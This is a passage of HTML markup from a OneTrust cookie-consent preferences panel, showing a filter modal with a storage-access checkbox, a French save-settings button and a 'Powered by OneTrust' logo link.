                                            </div>
                                        </li>
                                    </ul>
                                </div>
                            </div>
                        </section>
                    </div>
                    <div id="ot-triangle"></div>
                    <section id="ot-filter-modal">
                        <div id="ot-options">
                            <div id="clear-filters-container">
                                <a href="javascript:void(0)" id="clear-filters-handler" role="button">
                                    <p>Clear Filters</p>
                                </a>
                            </div>
                            <div class="ot-group-options">
                                <div class="ot-group-option">
                                    <div class="ot-checkbox"><input id="storage-access-group" class="ot-group-option-box category-filter-handler" type="checkbox"> <label for="storage-access-group"><span>Information storage and access</span></label></div>
                                </div>
                            </div><button id="filter-apply-handler" class="ot-pill">Apply</button></div>
                    </section>
                </section>
            </div>
            <!-- footer -->
            <div class="ot-button-group-parent">
                <div class="ot-button-group"><button class="save-preference-btn-handler onetrust-close-btn-handler">Enregistrer les paramètres</button> </div>
                <div class="ot-pc-footer-logo">
                    <a class="powered-by-logo" href="https://onetrust.com/poweredbyonetrust" target="_blank" rel="noopener" aria-label="Powered by One Trust" style="background-image: url(&quot;https://cdn.cookielaw.org/logos/static/poweredBy_ot_logo.svg&quot;)"></a>
                </div>
            </div>
        </div>
    </div>
</body>

</html>